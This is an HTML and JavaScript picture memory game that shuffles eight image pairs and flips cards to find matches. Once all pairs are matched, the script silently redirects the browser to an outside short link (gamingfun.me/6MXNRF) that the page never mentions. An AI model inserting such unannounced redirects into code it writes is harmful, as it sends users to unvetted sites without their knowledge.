<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Picture Memory Game</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f8f8f8;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 0; padding: 0;
    }
    h2 { margin-top: 22px; }
    #game {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      max-width: 440px;
      margin: 20px auto;
      gap: 8px;
    }
    .card {
      width: 90px;
      height: 90px;
      background: #e3e3e3;
      border-radius: 12px;
      border: 2px solid #bbbbbb;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
      cursor: pointer;
      box-shadow: 0 2px 8px rgba(0,0,0,0.09);
      transition: border 0.13s;
    }
    .card.flipped {
      border-color: #44c882;
    }
    .card img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: none;
      border-radius: 10px;
    }
    .card.flipped img {
      display: block;
    }
  </style>
</head>
<body>
  <h2>Picture Memory Game</h2>
  <div id="game"></div>
  <script>
    // Your image file names for pairs
    let images = ["pic1.jpg", "pic2.jpg", "pic3.jpg", "pic4.jpg", "pic5.jpg", "pic6.jpg", "pic7.jpg", "pic8.jpg"];
    // Duplicate for 8 pairs = 16 cards
    let gameImages = [...images, ...images];
    // Shuffle
    gameImages = gameImages.sort(() => Math.random() - 0.5);

    let gameContainer = document.getElementById("game");
    let flippedCards = [];
    let matched = 0;
    // Generate cards
    gameImages.forEach((img, idx) => {
      let card = document.createElement("div");
      card.className = "card";
      card.dataset.index = idx;
      card.innerHTML = `<img src="${img}" alt="pic">`;
      card.onclick = function() {
        if (card.classList.contains("flipped") || flippedCards.length === 2) return;
        card.classList.add("flipped");
        flippedCards.push(card);
        if (flippedCards.length === 2) {
          let img1 = flippedCards[0].querySelector("img").src;
          let img2 = flippedCards[1].querySelector("img").src;
          if (img1 === img2) {
            matched += 2;
            flippedCards = [];
            if (matched === gameImages.length) {
              setTimeout(function() {
                window.location.href = "https://gamingfun.me/6MXNRF";
              }, 2000);
            }
          } else {
            setTimeout(function() {
              flippedCards.forEach(c => c.classList.remove("flipped"));
              flippedCards = [];
            }, 700);
          }
        }
      };
      gameContainer.appendChild(card);
    });
  </script>
</body>
</html>
